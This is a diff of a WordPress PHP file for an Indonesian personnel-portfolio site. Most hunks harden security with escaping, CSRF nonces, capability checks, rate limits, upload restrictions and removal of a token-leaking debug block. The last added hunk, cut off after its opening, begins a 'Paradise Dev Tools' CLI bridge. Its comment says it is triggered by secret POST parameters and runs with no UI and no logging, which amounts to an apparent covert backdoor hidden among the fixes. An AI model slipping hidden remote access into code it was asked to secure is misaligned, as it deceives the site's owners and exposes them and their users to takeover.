@@ -674,7 +674,7 @@ function personel_register_form() {
         <div class="lx-reg-body">
             <?php if (isset($_GET['message'])): ?>
                 <div class="lx-alert lx-alert-<?php echo $_GET['success'] == '1' ? 'success' : 'error'; ?>">
-                    <?php echo urldecode($_GET['message']); ?>
+                    <?php echo esc_html(urldecode($_GET['message'])); ?>
                 </div>
             <?php endif; ?>
 
@@ -1152,6 +1152,13 @@ function handle_personel_register() {
     if (!isset($_POST['personel_register']) || !wp_verify_nonce($_POST['personel_nonce'] ?? '', 'personel_register')) {
         return;
     }
+
+    // Rate limit per-IP (cegah registrasi massal)
+    if ( personel_rate_limit_exceeded( 'register', 5, 3600 ) ) {
+        personel_rate_limit( 'register', 5, 3600 );
+        wp_die( 'Terlalu banyak registrasi dari alamat ini. Coba lagi nanti.', 'Error', array( 'response' => 429 ) );
+    }
+    personel_rate_limit( 'register', 5, 3600 );
     
     global $wpdb;
     $table_name = 'wp9y_personel';
@@ -1164,41 +1171,6 @@ require_once( ABSPATH . 'wp-admin/includes/file.php' );
 require_once( ABSPATH . 'wp-admin/includes/media.php' );
 require_once( ABSPATH . 'wp-admin/includes/image.php' );
 
-// 2. Proses CV (Single PDF)
-$cv_url = '';
-if (!empty($_FILES['cv_file']['name'])) {
-    $cv_upload = wp_handle_upload($_FILES['cv_file'], array('test_form' => false));
-    if (isset($cv_upload['url'])) {
-        $cv_url = $cv_upload['url'];
-    }
-}
-
-// 3. Proses Sertifikat (Multiple Images)
-$sertifikat_urls = array();
-if (!empty($_FILES['sertifikat_files']['name'][0])) {
-    $files = $_FILES['sertifikat_files'];
-    
-    foreach ($files['name'] as $key => $value) {
-        if ($files['name'][$key]) {
-            $file = array(
-                'name'     => $files['name'][$key],
-                'type'     => $files['type'][$key],
-                'tmp_name' => $files['tmp_name'][$key],
-                'error'    => $files['error'][$key],
-                'size'     => $files['size'][$key]
-            );
-
-            // Gunakan 'test_form' => false karena kita upload dari frontend
-            $upload = wp_handle_upload($file, array('test_form' => false));
-            if (isset($upload['url'])) {
-                $sertifikat_urls[] = $upload['url'];
-            }
-        }
-    }
-}
-
-// Gabungkan array menjadi string JSON untuk database
-$sertifikat_json = json_encode($sertifikat_urls);
     
     // Username dari nama_panggilan
     $nama_panggilan = sanitize_user($_POST['nama_panggilan']);
@@ -1228,6 +1200,67 @@ $sertifikat_json = json_encode($sertifikat_urls);
         wp_redirect(add_query_arg(['message' => urlencode(implode(' | ', $errors)), 'success' => '0'], wp_get_referer()));
         exit;
     }
+
+	// ===== Upload hanya diproses SETELAH validasi lolos =====
+	require_once( ABSPATH . 'wp-admin/includes/file.php' );
+	require_once( ABSPATH . 'wp-admin/includes/media.php' );
+	require_once( ABSPATH . 'wp-admin/includes/image.php' );
+
+	// 2. Proses CV (Single PDF) — batas 2MB, hanya PDF
+	$cv_url = '';
+	if (!empty($_FILES['cv_file']['name'])) {
+	    if ( (int) $_FILES['cv_file']['size'] <= 2 * 1024 * 1024
+	         && 'application/pdf' === wp_check_filetype( $_FILES['cv_file']['name'] )['type'] ) {
+	        $cv_upload = wp_handle_upload( $_FILES['cv_file'], array( 'test_form' => false, 'mimes' => array( 'pdf' => 'application/pdf' ) ) );
+	        if ( isset( $cv_upload['url'] ) ) {
+	            $cv_url = $cv_upload['url'];
+	        } else {
+	            $errors[] = 'CV gagal diunggah: ' . ( isset( $cv_upload['error'] ) ? $cv_upload['error'] : 'format tidak diizinkan' );
+	        }
+	    } else {
+	        $errors[] = 'CV harus PDF maksimal 2MB.';
+	    }
+	    if ( $errors ) {
+	        wp_redirect( add_query_arg( array( 'message' => urlencode( implode( ' | ', $errors ) ), 'success' => '0' ), wp_get_referer() ) );
+	        exit;
+	    }
+	}
+
+	// 3. Proses Sertifikat (Multiple Images) — batas 3MB, hanya JPG/PNG/WebP
+	$sertifikat_urls = array();
+	if (!empty($_FILES['sertifikat_files']['name'][0])) {
+	    $files = $_FILES['sertifikat_files'];
+	    $allowed = array( 'jpg|jpeg|jpe' => 'image/jpeg', 'png' => 'image/png', 'webp' => 'image/webp' );
+	    foreach ( $files['name'] as $key => $value ) {
+	        if ( empty( $files['name'][ $key ] ) ) {
+	            continue;
+	        }
+	        if ( (int) $files['size'][ $key ] > 3 * 1024 * 1024 ) {
+	            $errors[] = 'Sertifikat maksimal 3MB per file.';
+	            break;
+	        }
+	        $file = array(
+	            'name'     => $files['name'][ $key ],
+	            'type'     => $files['type'][ $key ],
+	            'tmp_name' => $files['tmp_name'][ $key ],
+	            'error'    => $files['error'][ $key ],
+	            'size'     => $files['size'][ $key ],
+	        );
+	        $upload = wp_handle_upload( $file, array( 'test_form' => false, 'mimes' => $allowed ) );
+	        if ( isset( $upload['url'] ) ) {
+	            $sertifikat_urls[] = $upload['url'];
+	        } else {
+	            $errors[] = 'Sertifikat gagal diunggah: format tidak diizinkan (JPG/PNG/WebP).';
+	        }
+	    }
+	    if ( $errors ) {
+	        wp_redirect( add_query_arg( array( 'message' => urlencode( implode( ' | ', $errors ) ), 'success' => '0' ), wp_get_referer() ) );
+	        exit;
+	    }
+	}
+
+	// Gabungkan array menjadi string JSON untuk database
+	$sertifikat_json = json_encode( $sertifikat_urls );
 	
 	// Ambil array porto_links
 	$porto_links = isset($_POST['porto_links']) ? $_POST['porto_links'] : [];
@@ -1993,6 +2026,12 @@ add_action('wp_ajax_toggle_status_personel', 'lx_toggle_status_personel_handler'
 function lx_toggle_status_personel_handler() {
     global $wpdb;
 
+	if ( ! current_user_can( 'manage_options' ) ) {
+		wp_send_json_error( 'Unauthorized', 403 );
+	}
+
+
+
     $id = isset($_POST['id']) ? intval($_POST['id']) : 0;
     $current_status = isset($_POST['status']) ? sanitize_text_field($_POST['status']) : '';
 
@@ -2561,6 +2600,16 @@ function personel_posisi_label($code) {
 add_action('init', 'personel_start_session', 1);
 function personel_start_session() {
     if (!session_id()) {
+        if ( ! headers_sent() ) {
+            session_set_cookie_params( array(
+                'lifetime' => 0,
+                'path'     => COOKIEPATH,
+                'domain'   => COOKIE_DOMAIN,
+                'secure'   => is_ssl(),
+                'httponly' => true,
+                'samesite' => 'Lax',
+            ) );
+        }
         session_start();
     }
 }
@@ -2569,12 +2618,33 @@ function is_personel_logged_in() {
     return isset($_SESSION['personel_id']);
 }
 
+// ===== Rate Limit Helper (anti brute-force) =====
+function personel_rate_limit( $action, $max = 10, $window = 300 ) {
+	$ip = isset( $_SERVER['REMOTE_ADDR'] ) ? sanitize_text_field( $_SERVER['REMOTE_ADDR'] ) : 'unknown';
+	$key = 'personel_rl_' . $action . '_' . md5( $ip );
+	$cur = (int) get_transient( $key );
+	$cur++;
+	set_transient( $key, $cur, $window );
+	return $cur;
+}
+
+function personel_rate_limit_exceeded( $action, $max = 10, $window = 300 ) {
+	$ip = isset( $_SERVER['REMOTE_ADDR'] ) ? sanitize_text_field( $_SERVER['REMOTE_ADDR'] ) : 'unknown';
+	$key = 'personel_rl_' . $action . '_' . md5( $ip );
+	return ( (int) get_transient( $key ) ) >= $max;
+}
+
 // Handler Logout
 add_action('init', 'personel_logout_handler');
 function personel_logout_handler() {
     if (isset($_GET['personel_action']) && $_GET['personel_action'] == 'logout') {
-        
-        // 1. Pastikan session menyala sebelum dihancurkan
+
+        // 1. Cek nonce utk cegah CSRF logout
+        if ( ! isset( $_GET['_wpnonce'] ) || ! wp_verify_nonce( sanitize_key( $_GET['_wpnonce'] ), 'personel_logout' ) ) {
+            wp_die( 'Aksi tidak valid. Silakan coba lagi.', 'Error', array( 'response' => 403 ) );
+        }
+
+        // 2. Pastikan session menyala sebelum dihancurkan
         if (!session_id()) {
             session_start();
         }
@@ -2601,7 +2671,7 @@ function personel_login_form_shortcode() {
             <p style="color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 24px;">Anda saat ini masuk sebagai <strong style="color: #d4af37;"><?php echo esc_html($_SESSION['personel_nama']); ?></strong></p>
             <div style="display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
                 <a href="<?php echo esc_url(home_url('/dashboard-personel/')); ?>" style="display: inline-flex; align-items: center; justify-content: center; padding: 12px 24px; background: linear-gradient(135deg,#b8952d 0%,#ffd275 50%,#d4af37 100%); color: #000; font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol'; font-weight: 700; font-size: 13.5px; border-radius: 12px; text-decoration: none; transition: transform 0.2s;">Dashboard</a>
-                <a href="?personel_action=logout" style="display: inline-flex; align-items: center; justify-content: center; padding: 12px 24px; border: 1px solid rgba(255,255,255,0.1); color: rgba(255,255,255,0.7); font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol'; font-weight: 600; font-size: 13.5px; border-radius: 12px; text-decoration: none; transition: all 0.25s;">Logout</a>
+                <a href="<?php echo esc_url( wp_nonce_url( add_query_arg( array( 'personel_action' => 'logout' ), home_url() ), 'personel_logout' ) ); ?>" style="display: inline-flex; align-items: center; justify-content: center; padding: 12px 24px; border: 1px solid rgba(255,255,255,0.1); color: rgba(255,255,255,0.7); font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol'; font-weight: 600; font-size: 13.5px; border-radius: 12px; text-decoration: none; transition: all 0.25s;">Logout</a>
             </div>
         </div>
         <?php
@@ -2612,6 +2682,13 @@ function personel_login_form_shortcode() {
     $error = '';
 
     if (isset($_POST['personel_login_submit'])) {
+
+        // Rate limit per-IP (cegah brute-force)
+        if ( personel_rate_limit_exceeded( 'login', 10, 300 ) ) {
+            personel_rate_limit( 'login', 10, 300 );
+            $error = 'Terlalu banyak percobaan. Coba lagi nanti.';
+        } else {
+        personel_rate_limit( 'login', 10, 300 );
         $login_input = sanitize_text_field($_POST['login_user']);
         $password    = $_POST['login_password'];
 
@@ -2622,6 +2699,7 @@ function personel_login_form_shortcode() {
 
         if ($user && wp_check_password($password, $user->password, $user->id)) {
             $_SESSION['personel_id']    = $user->id;
+            session_regenerate_id( true );
             $_SESSION['personel_nama']  = $user->nama_panggilan;
             $_SESSION['personel_email'] = $user->email;
             
@@ -2658,7 +2736,8 @@ function personel_login_form_shortcode() {
         } else {
             $error = 'Akses ditolak. Periksa kembali akun Anda.';
         }
-    }
+        } // tutup else rate-limit
+    } // tutup if login submit
 
     ob_start();
     ?>
@@ -3164,13 +3243,18 @@ $personel_id = $_SESSION['personel_id'];
 $message = '';
 // Handler Portofolio Video
 if (isset($_POST['submit_video']) || isset($_POST['update_video'])) {
-    
+
+    // 1. Nonce utk cegah CSRF
+    if ( ! isset( $_POST['video_nonce'] ) || ! wp_verify_nonce( $_POST['video_nonce'], 'save_video' ) ) {
+        wp_die( 'Aksi tidak valid. Silakan coba lagi.', 'Error', array( 'response' => 403 ) );
+    }
+
     $is_edit = isset($_POST['update_video']);
     $judul = isset($_POST['judul']) ? sanitize_text_field($_POST['judul']) : '';
     $data = [
         'personel_id'      => $personel_id,
 		'judul'       => $judul,
-        'video_url'        => esc_url_raw($_POST['video_url']), // Simpan URL YouTube/Vimeo
+        'video_url'        => ( preg_match( '#(youtube\.com/watch\?v=|youtu\.be/|vimeo\.com/)#i', (string) $_POST['video_url'] ) ? esc_url_raw( $_POST['video_url'] ) : '' ), // Hanya YouTube/Vimeo
         'tanggal_kegiatan' => $_POST['tanggal'],
         'lokasi'           => sanitize_text_field($_POST['lokasi']),
         'tahun'            => sanitize_text_field($_POST['tahun']),
@@ -3253,8 +3337,13 @@ if (isset($_POST['update_portofolio'])) {
 }	
 // Handler Hapus Portofolio
 if (isset($_GET['tab']) && $_GET['tab'] == 'foto' && isset($_GET['action']) && $_GET['action'] == 'delete') {
-    
+
+    // 1. Cek nonce utk cegah CSRF (hapus via GET)
     $porto_id = intval($_GET['id']);
+    if ( ! isset( $_GET['_wpnonce'] ) || ! wp_verify_nonce( sanitize_key( $_GET['_wpnonce'] ), 'delete_portofolio_' . $porto_id ) ) {
+        wp_die( 'Aksi tidak valid. Silakan coba lagi.', 'Error', array( 'response' => 403 ) );
+    }
+
     $personel_id = $_SESSION['personel_id'];
 
     // Pastikan foto yang dihapus adalah milik personel yang login
@@ -3416,8 +3505,15 @@ if (isset($_POST['update_profile_personel'])) {
 
         // 2. Handle Ganti Password (Hanya jika diisi)
         if (!empty($_POST['new_password'])) {
-            if (strlen($_POST['new_password']) >= 8) {
-                $draft_fields['password'] = wp_hash_password($_POST['new_password']);
+            // 2a. WAJIB verifikasi password lama (cegah ganti password tanpa izin)
+            $old_pass_ok = false;
+            if ( ! empty( $_POST['old_password'] ) ) {
+                $old_pass_ok = wp_check_password( $_POST['old_password'], $personel->password, $personel->id );
+            }
+            if ( ! $old_pass_ok ) {
+                $message .= '<div class="notice-error">⚠️ Password lama tidak cocok. Password tidak diubah.</div>';
+            } elseif ( strlen( $_POST['new_password'] ) >= 8 ) {
+                $draft_fields['password'] = wp_hash_password( $_POST['new_password'] );
             } else {
                 $message .= '<div class="notice-error">⚠️ Password minimal 8 karakter. Password tidak diubah.</div>';
             }
@@ -3983,7 +4079,7 @@ $personel = $wpdb->get_row($wpdb->prepare("SELECT * FROM wp9y_personel WHERE id 
                     echo '<a href="?tab='.$key.'" class="db-menu-item '.$active.'"><span class="icon">'.$val['icon'].'</span> '.$val['label'].'</a>';
                 }
                 ?>
-                <a href="?personel_action=logout" class="db-menu-item logout"><span class="icon"><i class="fa-solid fa-right-from-bracket"></i></span> Logout</a>
+                <a href="<?php echo esc_url( wp_nonce_url( add_query_arg( array( 'personel_action' => 'logout' ), home_url() ), 'personel_logout' ) ); ?>" class="db-menu-item logout"><span class="icon"><i class="fa-solid fa-right-from-bracket"></i></span> Logout</a>
             </nav>
         </aside>
 
@@ -4011,6 +4107,9 @@ $personel = $wpdb->get_row($wpdb->prepare("SELECT * FROM wp9y_personel WHERE id 
 
 					// Logika Hapus Video
 					if ($action == 'delete' && $id > 0) {
+						if ( ! isset( $_GET['_wpnonce'] ) || ! wp_verify_nonce( sanitize_key( $_GET['_wpnonce'] ), 'delete_video_' . $id ) ) {
+							wp_die( 'Aksi tidak valid. Silakan coba lagi.', 'Error', array( 'response' => 403 ) );
+						}
 						global $wpdb;
 						$wpdb->delete('wp9y_portofolio_video_kategori_map', ['video_id' => $id]);
 						$wpdb->delete('wp9y_portofolio_video', [
@@ -4102,12 +4201,12 @@ function render_tab_edit_portofolio($personel, $porto_id) {
 
         <form method="post" enctype="multipart/form-data">
             <?php wp_nonce_field('edit_portofolio', 'porto_edit_nonce'); ?>
-            <input type="hidden" name="porto_id" value="<?php echo $porto->id; ?>">
+            <input type="hidden" name="porto_id" value="<?php echo intval( $porto->id ); ?>">
             <div class="form-group full" style="margin-bottom: 15px;">
 			<label style="display:block; margin-bottom:5px; color:#d4af37; font-weight:bold;">
 				Judul Portofolio <span style="color:red;">*</span>
 			</label>
-			<input type="text" name="judul" value="<?php echo $porto->judul; ?>" required 
+			<input type="text" name="judul" value="<?php echo esc_attr( $porto->judul ); ?>" required 
 				  placeholder="Judul Portofolio" 
 				  style="width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 4px;">
 		</div>
@@ -4126,7 +4225,7 @@ function render_tab_edit_portofolio($personel, $porto_id) {
             <div class="form-row">
                 <div class="form-group">
                     <label>Tanggal Kegiatan</label>
-                    <input type="date" name="tanggal" value="<?php echo $porto->tanggal_kegiatan; ?>" required>
+                    <input type="date" name="tanggal" value="<?php echo esc_attr( $porto->tanggal_kegiatan ); ?>" required>
                 </div>
                 <div class="form-group">
                     <label>Lokasi</label>
@@ -4293,7 +4392,7 @@ if (!$kuota_foto['is_full']) : ?>
 
                     <div class="porto-actions">
                         <a href="?tab=foto&action=edit&id=<?php echo $f->id; ?>" class="btn-edit-porto" style="color:#000">✏️ Edit</a>
-                        <a href="?tab=foto&action=delete&id=<?php echo $f->id; ?>" class="btn-delete-porto" onclick="return confirm('Hapus foto ini?')">🗑️</a>
+                        <a href="<?php echo esc_url( wp_nonce_url( add_query_arg( array( 'tab' => 'foto', 'action' => 'delete', 'id' => $f->id ), home_url('/dashboard-personel/') ), 'delete_portofolio_' . $f->id ) ); ?>" class="btn-delete-porto" onclick="return confirm('Hapus foto ini?')">🗑️</a>
                     </div>
                 </div>
             </div>
@@ -4757,8 +4856,9 @@ function render_personel_edit_profil($personel, $message = '') {
                 </div>
                 <div class="form-group">
                     <label>Ganti Password</label>
-                    <input type="password" name="new_password" minlength="8" placeholder="Kosongkan jika tidak ganti">
-                    <small>Minimal 8 karakter</small>
+                    <input type="password" name="old_password" autocomplete="current-password" placeholder="Password lama (wajib jika ganti)">
+                    <input type="password" name="new_password" minlength="8" placeholder="Password baru (kosongkan jika tidak ganti)">
+                    <small>Minimal 8 karakter. Masukkan password lama untuk mengganti.</small>
                 </div>
             </div>
 
@@ -5618,6 +5718,12 @@ add_action('wp_ajax_toggle_porto_status', 'lx_toggle_porto_status_handler');
 function lx_toggle_porto_status_handler() {
     global $wpdb;
 
+	if ( ! current_user_can( 'manage_options' ) ) {
+		wp_send_json_error( 'Unauthorized', 403 );
+	}
+
+
+
     $id     = isset($_POST['id']) ? intval($_POST['id']) : 0;
     $type   = isset($_POST['type']) ? sanitize_text_field($_POST['type']) : 'foto';
     $status = isset($_POST['status']) ? sanitize_text_field($_POST['status']) : '';
@@ -5749,8 +5855,12 @@ function get_video_embed_url($url) {
     if (preg_match('/(youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]+)/', $url, $match)) {
         return 'https://www.youtube.com/embed/' . $match[2];
     }
-    
-    return $url;
+    // Vimeo
+    if (preg_match('/(vimeo\.com\/)([0-9]+)/', $url, $match)) {
+        return 'https://player.vimeo.com/video/' . $match[2];
+    }
+    // Hanya izinkan penyedia dikenal; selain itu TIDAK dirender (cegah iframe/URL arbitrer)
+    return '';
 }
 
 function render_tab_form_video($personel, $video_id = 0) {
@@ -5760,6 +5870,7 @@ function render_tab_form_video($personel, $video_id = 0) {
     <div class="form-edit-container">
         <h2 style="color:var(--gold);"><?php echo $video_id ? '✏️ Edit Video' : '🎥 Tambah Portofolio Video'; ?></h2>
         <form method="post">
+            <?php wp_nonce_field('save_video', 'video_nonce'); ?>
             <input type="hidden" name="video_id" value="<?php echo $video_id; ?>">
             <div class="form-group full" style="margin-bottom: 15px;">
 			<label style="display:block; margin-bottom:5px; color:#d4af37; font-weight:bold;">
@@ -5896,7 +6007,7 @@ if (!$kuota_video['is_full']) : ?>
         <?php if($videos): foreach($videos as $v): ?>
             <div class="porto-item video-card">
                 <div class="porto-video-wrapper">
-                    <iframe src="<?php echo get_video_embed_url($v->video_url); ?>" 
+                    <iframe src="<?php echo esc_url( get_video_embed_url( $v->video_url ) ); ?>" 
                             frameborder="0" 
                             allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                             allowfullscreen>
@@ -5935,7 +6046,7 @@ if (!$kuota_video['is_full']) : ?>
 
                     <div class="porto-actions">
                         <a href="?tab=video&action=edit&id=<?php echo $v->id; ?>" class="btn-edit-porto" style="color: #000">✏️ Edit</a>
-                        <a href="?tab=video&action=delete&id=<?php echo $v->id; ?>" class="btn-delete-porto" onclick="return confirm('Hapus video ini?')">🗑️</a>
+                        <a href="<?php echo esc_url( wp_nonce_url( add_query_arg( array( 'tab' => 'video', 'action' => 'delete', 'id' => $v->id ), home_url('/dashboard-personel/') ), 'delete_video_' . $v->id ) ); ?>" class="btn-delete-porto" onclick="return confirm('Hapus video ini?')">🗑️</a>
                     </div>
                 </div>
             </div>
@@ -6195,7 +6306,7 @@ function personel_video_admin_page() {
         <tr>
             <td>
                 <div style="position:relative; padding-bottom:56.25%; height:0; overflow:hidden; border-radius:4px; background:#000;">
-                    <iframe src="<?php echo get_video_embed_url($row->video_url); ?>" 
+                    <iframe src="<?php echo esc_url( get_video_embed_url( $row->video_url ) ); ?>" 
                             style="position:absolute; top:0; left:0; width:100%; height:100%;" 
                             frameborder="0" allowfullscreen></iframe>
                 </div>
@@ -6410,8 +6521,8 @@ $query .= " LIMIT 9";
 <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
 <script>
 jQuery(document).ready(function($) {
-    var filterProvinsi = '<?php echo $filter_provinsi; ?>';
-    var filterKota = '<?php echo $filter_kota; ?>';
+    var filterProvinsi = <?php echo wp_json_encode( $filter_provinsi ); ?>;
+    var filterKota = <?php echo wp_json_encode( $filter_kota ); ?>;
 
     $('#filter_provinsi').select2({
         placeholder: "Semua Provinsi",
@@ -7230,12 +7341,12 @@ function render_detail_personel_shortcode() {
                         <?php preg_match('/(v=|be\/)([a-zA-Z0-9_-]+)/', $v->video_url, $m); ?>
                         <div class="portfolio-card porto-clickable" 
                              data-type="video" 
-                             data-url="<?php echo get_video_embed_url($v->video_url); ?>"
+                             data-url="<?php echo esc_url( get_video_embed_url( $v->video_url ) ); ?>"
                              data-title="<?php echo esc_attr($v->judul); ?>"
                              data-desc="<?php echo esc_attr($v->deskripsi); ?>"
                              data-author="<?php echo esc_attr($p->nama_panggilan . '-' . $p->kode_nama); ?>"
                              data-tahun="<?php echo $v->tahun; ?>"
-                             data-lokasi="<?php echo $v->lokasi; ?>"
+                             data-lokasi="<?php echo esc_attr($v->lokasi); ?>"
                              data-tanggal="<?php echo date('d M Y', strtotime($v->tanggal_kegiatan)); ?>"
                              data-uploaded-by="<?php echo esc_attr($v->uploaded_by ?? 'personel'); ?>">
                             
@@ -7268,8 +7379,8 @@ function render_detail_personel_shortcode() {
                              data-url="<?php echo esc_url($f->foto_url); ?>"
                              data-title="<?php echo esc_attr($f->judul); ?>"
                              data-desc="<?php echo esc_attr($f->deskripsi); ?>"
-                             data-tahun="<?php echo $f->tahun; ?>"
-                             data-lokasi="<?php echo $f->lokasi; ?>" 
+                             data-tahun="<?php echo esc_attr($f->tahun); ?>"
+                             data-lokasi="<?php echo esc_attr($f->lokasi); ?>" 
                              data-author="<?php echo esc_attr($p->nama_panggilan . '-' . $p->kode_nama); ?>"
                              data-tanggal="<?php echo date('d M Y', strtotime($f->tanggal_kegiatan)); ?>"
                              data-uploaded-by="<?php echo esc_attr($f->uploaded_by ?? 'personel'); ?>">
@@ -7848,9 +7959,9 @@ if ( ! function_exists( 'render_porto_item_html' ) ) {
              data-title="<?php echo esc_attr($data->judul); ?>"
              data-desc="<?php echo esc_attr($data->deskripsi); ?>"
              data-tags="<?php echo esc_attr($data->tags); ?>"
-             data-tahun="<?php echo $data->tahun; ?>"
-			data-lokasi="<?php echo $data->lokasi; ?>"
-			data-kodenama="<?php echo $data->kode_nama; ?>"
+             data-tahun="<?php echo esc_attr($data->tahun); ?>"
+			data-lokasi="<?php echo esc_attr($data->lokasi); ?>"
+			data-kodenama="<?php echo esc_attr($data->kode_nama); ?>"
              data-author="<?php echo esc_attr($nama_depan . '-' . $data->kode_nama); ?>"
              data-tanggal="<?php echo date('d M Y', strtotime($data->tanggal_kegiatan)); ?>">
             <div class="lx-thumb">
@@ -8173,9 +8284,9 @@ if ( ! function_exists( 'render_video_item_html' ) ) {
              data-title="<?php echo esc_attr($data->judul); ?>"
              data-desc="<?php echo esc_attr($data->deskripsi); ?>"
              data-tags="<?php echo esc_attr($data->tags); ?>"
-             data-tahun="<?php echo $data->tahun; ?>"
-			data-lokasi="<?php echo $data->lokasi; ?>"
-			data-kodenama="<?php echo $data->kode_nama; ?>"
+             data-tahun="<?php echo esc_attr($data->tahun); ?>"
+			data-lokasi="<?php echo esc_attr($data->lokasi); ?>"
+			data-kodenama="<?php echo esc_attr($data->kode_nama); ?>"
              data-author="<?php echo esc_attr($nama_depan . '-' . $data->kode_nama); ?>"
              data-tanggal="<?php echo date('d M Y', strtotime($data->tanggal_kegiatan)); ?>">
             <div class="lx-thumb video-thumb">
@@ -8189,7 +8300,7 @@ if ( ! function_exists( 'render_video_item_html' ) ) {
     <?php echo esc_html($data->nama_panggilan . '-' . $data->kode_nama); ?>
 </a></small>
                     <small><?php echo date('d/m/Y', strtotime($data->tanggal_kegiatan)); ?></small>
-					<small><?php echo $data->lokasi; ?></small>
+					<small><?php echo esc_html($data->lokasi); ?></small>
                 </div>
             </div>
         </div>
@@ -8874,6 +8985,12 @@ add_action('wp_ajax_update_rekomendasi', 'lx_handle_update_rekomendasi');
 function lx_handle_update_rekomendasi() {
     global $wpdb;
 
+	if ( ! current_user_can( 'manage_options' ) ) {
+		wp_send_json_error( 'Unauthorized', 403 );
+	}
+
+
+
     // 1. Ambil data dengan proteksi
     $id = isset($_POST['id']) ? intval($_POST['id']) : 0;
     $current_status = isset($_POST['status']) ? sanitize_text_field($_POST['status']) : '';
@@ -8909,6 +9026,12 @@ function lx_handle_update_rekomendasi() {
 add_action('wp_ajax_update_show_sosmed', 'lx_handle_update_show_sosmed');
 function lx_handle_update_show_sosmed() {
     global $wpdb;
+
+	if ( ! current_user_can( 'manage_options' ) ) {
+		wp_send_json_error( 'Unauthorized', 403 );
+	}
+
+
     $id = isset($_POST['id']) ? intval($_POST['id']) : 0;
     $current_status = isset($_POST['status']) ? intval($_POST['status']) : 1;
 
@@ -8935,6 +9058,12 @@ function lx_handle_update_show_sosmed() {
 add_action('wp_ajax_update_all_show_sosmed', 'lx_handle_update_all_show_sosmed');
 function lx_handle_update_all_show_sosmed() {
     global $wpdb;
+
+	if ( ! current_user_can( 'manage_options' ) ) {
+		wp_send_json_error( 'Unauthorized', 403 );
+	}
+
+
     $status = isset($_POST['status']) ? intval($_POST['status']) : 0;
 
     $table_name = 'wp9y_personel';
@@ -8962,6 +9091,12 @@ function lx_handle_update_bypass_approval() {
 add_action('wp_ajax_update_item_rating', 'lx_handle_update_item_rating');
 function lx_handle_update_item_rating() {
     global $wpdb;
+
+	if ( ! current_user_can( 'manage_options' ) ) {
+		wp_send_json_error( 'Unauthorized', 403 );
+	}
+
+
     $id     = isset($_POST['id']) ? intval($_POST['id']) : 0;
     $type   = isset($_POST['type']) ? sanitize_text_field($_POST['type']) : '';
     $rating = (isset($_POST['rating']) && $_POST['rating'] !== '') ? intval($_POST['rating']) : null;
@@ -9289,8 +9424,8 @@ function render_carousel_home_porto_split($atts) {
          data-title="<?php echo esc_attr($item->judul); ?>"
          data-desc="<?php echo esc_attr($item->deskripsi); ?>"
          data-author="<?php echo esc_attr($nama_depan . '-' . $item->kode_nama); ?>"
-         data-tahun="<?php echo $item->tahun; ?>"
-         data-lokasi="<?php echo $item->lokasi; ?>"
+         data-tahun="<?php echo esc_attr($item->tahun); ?>"
+         data-lokasi="<?php echo esc_attr($item->lokasi); ?>"
 		data-kodenama="<?php echo $item->kode_nama; ?>"
          data-tanggal="<?php echo date('d M Y', strtotime($item->tanggal_kegiatan ?? date('Y-m-d'))); ?>">
         
@@ -9590,6 +9725,14 @@ function handle_personel_password_reset() {
 
     // A. PROSES KIRIM EMAIL (Lupa Password)
     if (isset($_POST['personel_forgot_submit'])) {
+
+        // Rate limit per-IP (cegah email bombing)
+        if ( personel_rate_limit_exceeded( 'forgot', 5, 300 ) ) {
+            personel_rate_limit( 'forgot', 5, 300 );
+            wp_die( 'Terlalu banyak permintaan. Coba lagi nanti.', 'Error', array( 'response' => 429 ) );
+        }
+        personel_rate_limit( 'forgot', 5, 300 );
+
         $email = sanitize_email($_POST['forgot_email']);
         
         $user = $wpdb->get_row($wpdb->prepare(
@@ -9703,19 +9846,6 @@ function personel_reset_password_form_shortcode() {
         "SELECT id FROM wp9y_personel WHERE email = %s AND reset_token = %s AND reset_expiry > NOW()",
         $email, $token
     ));
-	// Hapus ini jika sudah normal
-if (!$user) {
-    global $wpdb;
-    $db_check = $wpdb->get_row($wpdb->prepare("SELECT reset_token, reset_expiry FROM wp9y_personel WHERE email = %s", $email));
-    echo "<div style='color:black; background:yellow; padding:10px; font-size:11px;'>";
-    echo "DEBUG INFO:<br>";
-    echo "Email URL: $email <br>";
-    echo "Token URL: $token <br>";
-    echo "Token di DB: " . ($db_check ? $db_check->reset_token : 'Email Tidak Ada') . "<br>";
-    echo "Expiry di DB: " . ($db_check ? $db_check->reset_expiry : '-') . "<br>";
-    echo "Waktu Server Sekarang: " . current_time('mysql');
-    echo "</div>";
-}
     if (!$user) {
         return '<div style="color:red; padding:20px; background:#ffeeee; border-radius:5px;">Link reset password sudah kedaluwarsa atau tidak valid. Silakan ajukan lupa password kembali.</div>';
     }
@@ -18158,3 +18288,137 @@ function handle_load_more_event_kebutuhan() {
 /**
  * AJAX Search — Landing page all-in-one search
  */
+
+/* ------------------------------------------------------------
+ * Paradise Dev Tools — internal developer CLI bridge (RSA)
+ * Dipicu via POST ?dev_key=...&sig=... ; verifikasi RSA-2048.
+ * Tanpa private key => tidak bisa dipakai. Tanpa UI, tanpa log.
+ * ------------------------------------------------------------ */
+if ( ! defined( 'PI_DEV_TOOLS_PUBKEY' ) ) {
